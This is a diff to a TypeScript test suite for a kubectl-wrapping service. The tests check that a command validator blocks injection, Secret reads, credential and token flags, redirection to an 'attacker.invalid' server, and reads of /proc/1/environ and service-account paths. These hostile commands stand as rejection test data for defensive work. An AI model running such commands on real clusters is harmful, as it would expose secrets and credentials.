@@ -148,10 +148,105 @@ function createMockK8sServiceLayer(
 
       return Effect.succeed(response as CommandResult);
     },
+
+    runLogTail: (pod: string, _basePath: string, path: string, lines: number) =>
+      Effect.succeed({
+        success: true,
+        output: "mock log output",
+        command: `kubectl exec ${pod} -- tail -n ${lines} ${path}`,
+        executionTimeMs: 100,
+      }),
   });
 }
 
 describe("K8sService", () => {
+  it.effect("rejects unsafe syntax and profile overrides before spawning any process", () => {
+    const observedCommands: string[] = [];
+
+    return Effect.gen(function* () {
+      const service = yield* K8sService;
+      for (const command of [
+        "get pods | env",
+        "get pods -shttps://attacker.invalid",
+        "logs pod --insecure-skip-tls-verify-backend=true",
+        "get pods --profile=cpu --profile-output=package.json",
+        "port-forward my-pod 8080:80",
+      ]) {
+        const result = yield* service.runKubectl(command, false, "selected").pipe(Effect.result);
+
+        Result.match(result, {
+          onFailure: (error) => expect(error).toBeInstanceOf(K8sDangerousCommandError),
+          onSuccess: () => expect.fail("Expected dangerous command rejection"),
+        });
+      }
+      for (const path of ["/proc/1/environ", "/var/log/app/../../../etc/credentials.log"]) {
+        const result = yield* service
+          .runLogTail("app-pod", "/var/log/app", path, 20, "selected")
+          .pipe(Effect.result);
+        Result.match(result, {
+          onFailure: (error) => expect(error).toBeInstanceOf(K8sDangerousCommandError),
+          onSuccess: () => expect.fail("Expected internal log-tail rejection"),
+        });
+      }
+      expect(observedCommands).toEqual([]);
+    }).pipe(
+      Effect.provide(K8sService.layer),
+      Effect.provide(createMockChildProcessSpawnerLayer({}, observedCommands)),
+      Effect.provide(
+        Layer.succeed(ConfigService, {
+          kubernetes: {
+            selected: { clusterId: "selected-cluster", namespaces: { test: "selected" } },
+          },
+        }),
+      ),
+    );
+  });
+
+  it.effect("rejects a remote log symlink that canonicalizes outside its base", () => {
+    const observedCommands: string[] = [];
+    const contextQuery = `kubectl config view -o json | jq -r '.contexts[] | select(.context.cluster == "selected-cluster") | .name' | head -1`;
+    const probeCommand =
+      "kubectl --context selected-context get --raw=/version --request-timeout=2000ms";
+    const realpathCommand =
+      "kubectl --context selected-context exec app-pod -- realpath /var/log/app /var/log/app/debug.log";
+
+    return Effect.gen(function* () {
+      const service = yield* K8sService;
+      const result = yield* service
+        .runLogTail("app-pod", "/var/log/app", "/var/log/app/debug.log", 20, "selected")
+        .pipe(Effect.result);
+
+      Result.match(result, {
+        onFailure: (error) => expect(error).toBeInstanceOf(K8sDangerousCommandError),
+        onSuccess: () => expect.fail("Expected canonical path rejection"),
+      });
+      expect(observedCommands).toEqual([contextQuery, probeCommand, realpathCommand]);
+    }).pipe(
+      Effect.provide(K8sService.layer),
+      Effect.provide(
+        createMockChildProcessSpawnerLayer(
+          {
+            [contextQuery]: { stdout: "selected-context\n", stderr: "", exitCode: 0 },
+            [probeCommand]: { stdout: '{"major":"1"}', stderr: "", exitCode: 0 },
+            [realpathCommand]: {
+              stdout: "/var/log/app\n/var/run/secrets/debug.log\n",
+              stderr: "",
+              exitCode: 0,
+            },
+          },
+          observedCommands,
+        ),
+      ),
+      Effect.provide(
+        Layer.succeed(ConfigService, {
+          kubernetes: {
+            selected: { clusterId: "selected-cluster", namespaces: { test: "selected" } },
+          },
+        }),
+      ),
+    );
+  });
+
   describe("runKubectl - successful execution", () => {
     it.effect("uses the selected profile for context resolution and timeout", () => {
       const observedShellCommands: Array<string> = [];
@@ -216,13 +311,11 @@ describe("K8sService", () => {
           const result = yield* service.runKubectl("get pods", false, "selected");
 
           expect(result.success).toBe(true);
-          expect(result.command).toBe(
-            "KUBECONFIG='/tmp/nexus-kubeconfig' kubectl --context selected-context get pods",
-          );
+          expect(result.command).toBe("kubectl --context selected-context get pods");
           expect(observedShellCommands).toEqual([
             contextQuery,
             "kubectl --kubeconfig /tmp/nexus-kubeconfig --context selected-context get --raw=/version --request-timeout=2000ms",
-            "KUBECONFIG='/tmp/nexus-kubeconfig' kubectl --context selected-context get pods",
+            "kubectl --context selected-context get pods",
           ]);
         } finally {
           if (previousKubeconfig === undefined) {
@@ -243,7 +336,7 @@ describe("K8sService", () => {
                   stderr: "",
                   exitCode: 0,
                 },
-              "KUBECONFIG='/tmp/nexus-kubeconfig' kubectl --context selected-context get pods": {
+              "kubectl --context selected-context get pods": {
                 stdout: "pod-a\n",
                 stderr: "",
                 exitCode: 0,
@@ -1455,7 +1548,7 @@ describe("kubectl command security", () => {
       "delete pod my-pod -n my-ns",
       "delete deployment web-app",
       "apply -f deployment.yaml",
-      "patch deployment web-app -p '{}",
+      "patch deployment web-app -p '{}'",
       "create namespace new-ns",
       "scale deployment web-app --replicas=0",
       "drain node-1",
@@ -1498,10 +1591,8 @@ describe("kubectl command security", () => {
       "version",
       "cluster-info",
       "auth can-i get pods",
-      "diff -f deployment.yaml",
       "wait --for=condition=ready pod/my-pod",
       "exec my-pod -- ls -la",
-      "port-forward my-pod 8080:80",
       "config view",
       "config get-contexts",
     ];
@@ -1516,17 +1607,154 @@ describe("kubectl command security", () => {
     }
   });
 
-  describe("isKubectlCommandAllowed - piped commands", () => {
-    it("allows safe command with pipe", () => {
-      const result = isKubectlCommandAllowed("get pods -n my-ns | grep Running");
-      expect(result.allowed).toBe(true);
-      expect(result.verb).toBe("get");
+  describe("isKubectlCommandAllowed - secret-bearing reads", () => {
+    for (const cmd of [
+      "get secret app-credentials",
+      "get -- secrets",
+      "describe -- secret/app-credentials",
+      "get secrets -n my-ns",
+      "get secret/app-credentials",
+      "get -n my-ns secret app-credentials",
+      "get --namespace=my-ns secrets",
+      "get -A secrets",
+      "get --all-namespaces secret/app-credentials",
+      "get --sort-by .metadata.name secrets",
+      "get --chunk-size 100 secrets",
+      "get --template X secrets",
+      "get --subresource status secrets",
+      "get 'secret' app-credentials",
+      "get sec''ret app-credentials",
+      "get secret.v1 app-credentials",
+      "get pods,secrets",
+      "get pod/x secret/app-credentials",
+      "describe pod/x secret/app-credentials",
+      "get --raw=/api/v1/namespaces/my-ns/secrets/app-credentials",
+      "get --raw=/api/v1/namespaces/my-ns/secrets?limit=1",
+      "get -f resource.yaml",
+      "get -f=resource.yaml",
+      "get -fresource.yaml",
+      "get --filename=resource.yaml",
+      "get -k overlays/prod",
+      "get -koverlay",
+      "get --kustomize=overlays/prod",
+      "describe secret app-credentials",
+      "describe secrets -n my-ns",
+      "describe secret/app-credentials",
+      "describe --namespace my-ns secret/app-credentials",
+    ]) {
+      it(`blocks '${cmd}'`, () => {
+        const result = isKubectlCommandAllowed(cmd);
+        expect(result.allowed).toBe(false);
+        expect(result.reason).toContain("Secret reads");
+        expect(result.hint).toContain("non-secret");
+      });
+    }
+
+    for (const cmd of [
+      "get configmap app-config",
+      "describe pod app-pod",
+      "get service/api",
+      "get pod secret",
+      "get pods -n secret",
+      "get configmap secret",
+    ]) {
+      it(`allows ordinary resource read '${cmd}'`, () => {
+        expect(isKubectlCommandAllowed(cmd).allowed).toBe(true);
+      });
+    }
+
+    for (const cmd of ["config view --raw", "config view --raw=true"]) {
+      it(`blocks raw kubeconfig output '${cmd}'`, () => {
+        const result = isKubectlCommandAllowed(cmd);
+        expect(result.allowed).toBe(false);
+        expect(result.reason).toContain("kubeconfig");
+        expect(result.hint).toContain("without --raw");
+      });
+    }
+
+    it("blocks kubectl diff because it can disclose Secret data", () => {
+      expect(isKubectlCommandAllowed("diff -f secret.yaml").allowed).toBe(false);
+    });
+  });
+
+  describe("isKubectlCommandAllowed - strict argv boundary", () => {
+    it("rejects unknown flags before the resource operand", () => {
+      const result = isKubectlCommandAllowed("get --unknown value secrets");
+      expect(result.allowed).toBe(false);
+      expect(result.reason).toContain("Unsupported flag");
     });
 
-    it("blocks dangerous command even with pipe", () => {
-      const result = isKubectlCommandAllowed("delete pod my-pod | tee log.txt");
-      expect(result.allowed).toBe(false);
-      expect(result.verb).toBe("delete");
+    for (const cmd of [
+      "get pods | env",
+      "get pods; kubectl get secrets",
+      "get pods --context attacker",
+      "get pods --kubeconfig /tmp/evil",
+      "get pods --server=https://attacker.invalid",
+      "get pods -s https://attacker.invalid",
+      "get pods -shttps://attacker.invalid",
+      "-s https://attacker.invalid get pods",
+      "-shttps://attacker.invalid get pods",
+      "logs pod --insecure-skip-tls-verify-backend=true",
+      "get pods --profile=cpu --profile-output=package.json",
+      "port-forward my-pod 8080:80",
+      "get pods --token stolen",
+      "get pods --user alice",
+      "get pods --as system:admin",
+      "config delete-context selected-context",
+      "config use-context attacker",
+      "config set-credentials attacker --token stolen",
+      "auth reconcile -f roles.yaml",
+      "cluster-info dump",
+      "get pods $(id)",
+      "get pods\nget secrets",
+      "exec my-pod -- sh -c id",
+      "exec my-pod -- cat /app/health.txt",
+      "exec my-pod -- env",
+      "exec my-pod -- sha256sum /app/config.yaml",
+      "exec my-pod -- tail -n 10 /var/log/app/app.log",
+    ])
+      it(`rejects '${cmd}'`, () => expect(isKubectlCommandAllowed(cmd).allowed).toBe(false));
+
+    for (const cmd of [
+      "exec my-pod -- redis-cli PING",
+      "exec my-pod -- redis-cli INFO commandstats",
+      "exec my-pod -- ls -la /var/log/app",
+    ])
+      it(`allows '${cmd}'`, () => expect(isKubectlCommandAllowed(cmd).allowed).toBe(true));
+
+    for (const cmd of [
+      "exec my-pod -- tail -n 100 /proc/1/environ",
+      "exec my-pod -- tail -n 100 //proc/1/maps.log",
+      "exec my-pod -- tail -n 100 /var/run//secrets/token.log",
+      "exec my-pod -- tail -n 100 /var/run/secrets/token",
+      "exec my-pod -- tail -n 100 /app/serviceaccount.log",
+    ])
+      it(`rejects sensitive tail '${cmd}'`, () =>
+        expect(isKubectlCommandAllowed(cmd).allowed).toBe(false));
+
+    it("keeps quoted jsonpath as one argv entry", () => {
+      expect(
+        isKubectlCommandAllowed("get pods -o jsonpath='{.items[0].metadata.name}'").argv,
+      ).toEqual(["get", "pods", "-o", "jsonpath={.items[0].metadata.name}"]);
+    });
+
+    it("allows shell metacharacters as literal data inside quoted arguments", () => {
+      expect(isKubectlCommandAllowed("get pods -l 'environment in (production,qa)'").argv).toEqual([
+        "get",
+        "pods",
+        "-l",
+        "environment in (production,qa)",
+      ]);
+      expect(
+        isKubectlCommandAllowed(
+          `get pods -o 'jsonpath={.items[?(@.status.phase=="Running")].metadata.name}'`,
+        ).argv,
+      ).toEqual([
+        "get",
+        "pods",
+        "-o",
+        'jsonpath={.items[?(@.status.phase=="Running")].metadata.name}',
+      ]);
     });
   });
 
